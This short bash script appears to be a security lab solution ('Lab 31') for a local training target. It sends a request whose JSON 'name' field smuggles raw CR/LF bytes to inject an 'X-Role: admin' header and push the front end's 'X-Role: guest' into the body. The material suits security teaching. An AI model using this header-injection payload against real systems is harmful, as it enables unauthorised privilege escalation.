#!/usr/bin/env bash
# Lab 31 — a newline inside a header value ends that header and begins another.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9310}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab31

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# `$'…'` gives the shell real CR and LF bytes. They travel inside a JSON string,
# so nothing on the way has to be tricked into producing them.
#
# The payload ends the header block outright (a second CRLF), which puts the
# front end's own `X-Role: guest` into the body where no parser will read it.
# That works whether the receiver keeps the first duplicate header or the last.
send "$SESSION" req_0 --create --set method=POST --set path=/api/report \
    --set header.Content-Type=application/json \
    --set "json.name=quarterly"$'\r\n'"X-Role: admin"$'\r\n\r\n' | flag
